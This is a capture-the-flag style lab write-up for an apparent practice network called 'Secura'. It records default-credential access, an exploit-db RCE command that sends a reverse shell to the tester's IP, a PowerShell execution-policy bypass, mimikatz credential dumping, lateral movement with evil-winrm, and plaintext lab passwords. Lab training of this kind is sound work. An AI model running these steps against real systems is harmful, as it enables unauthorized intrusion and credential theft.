# Secura

## Network

**Given:**

- 192.168.180.0/24

**Found:**

- 192.168.180.95
- 192.168.180.96
- 192.168.180.97 / DC01

## Creds

```
admin:admin (applications manager portal)
administrator:Reality2Show4!.? (local admin in 192.168.180.95)
apache:New2Era4.! (local account in 192.168.180.96)
administrator:Almost4There8.? (local account in x.x.x.96, found in mysql in 192.168.180.96)
charlotte:Game20n4.! (mysql in 192.168.180.96)

other users:
michael
```

## Enumeration

Ping sweeping the subnet give us three machines.

![](assets/Pasted%20image%2020250211205503.png)

## 192.168.180.95

### Enumeration

![](assets/Pasted%20image%2020250211211330.png)

Going to port 5001 we can see that the web server is in port 44444

![](assets/Pasted%20image%2020250211225426.png)

In port 44444 we can see the main page of the service: applications manager by manage engine

![](assets/Pasted%20image%2020250211225526.png)

Clicking on first time user? give us the default password `admin:admin` 

Inside we can see the app panel

![](assets/Pasted%20image%2020250211225802.png)

### Initial Access

Searching for vulnerabilities, we try the RCE authenticated one.
https://www.exploit-db.com/exploits/48793

![](assets/Pasted%20image%2020250211234131.png)

We have to edit the script and change the java version to 8 for the script to work.

Start a listener on 666 and executed the script like this:

![](assets/Pasted%20image%2020250211234228.png)

```bash
$ python rce.py http://192.168.180.95:44444 admin admin 192.168.45.229 6666
```

![](assets/Pasted%20image%2020250211234455.png)

And we get a shell

![](assets/Pasted%20image%2020250211234422.png)

### Post Exploitation

We transfer winPEAS and adPEAS to the host using a python server and then iwr.

![](assets/Pasted%20image%2020250212000051.png)

![](assets/Pasted%20image%2020250212000127.png)

To execute the script we need to bypass powershell protection with

```bash
powershell -ep bypass
```

Then import and invoke the script:

![](assets/Pasted%20image%2020250212000241.png)

We find charlotte who is member of Remote management users so we can rdp with it.

![](assets/Pasted%20image%2020250212000520.png)

After that, we execute winPEAS.

![](assets/Pasted%20image%2020250212000712.png)

Found autologgon creds for Administrator

![](assets/Pasted%20image%2020250212001008.png)

And all the users and groups

![](assets/Pasted%20image%2020250212002227.png)

Transfer mimikatz to the machine and:

![](assets/Pasted%20image%2020250212003827.png)

Check with cme and it's a local account for the other machine

![](assets/Pasted%20image%2020250212004020.png)

Trying with winrm we can connect as a local account.

![](assets/Pasted%20image%2020250212112734.png)

To get the flag, evil-winrm with administrator

![](assets/Pasted%20image%2020250212132811.png)
## 192.168.180.96

### Enumeration

![](assets/Pasted%20image%2020250211211048.png)

### Initial Access

Connect to this machine with evil-winrm with credentials we found in x.x.x.95.

![](assets/Pasted%20image%2020250212112450.png)

### Privesc

We found a xampp folder, inside we found mysql binaries and the current user has permissions to execute so

![](assets/Pasted%20image%2020250212121021.png)

We got `administrator:Almost4There8.?` and `charlotte:Game20n4.!`

### Post Explotation

We reconnect with admin rights and got the flag.

![](assets/Pasted%20image%2020250212131746.png)

## 192.168.180.97

### Enumeration

![](assets/Pasted%20image%2020250211211138.png)

We can see that this host is the domain controller called dc01.secura.yzx.

We can evil-winrm using charlotte credentials but is not working due to the lab

!!! bug
    I couldn't finishg this lab even following the walkthroughs, the lab is super unstable.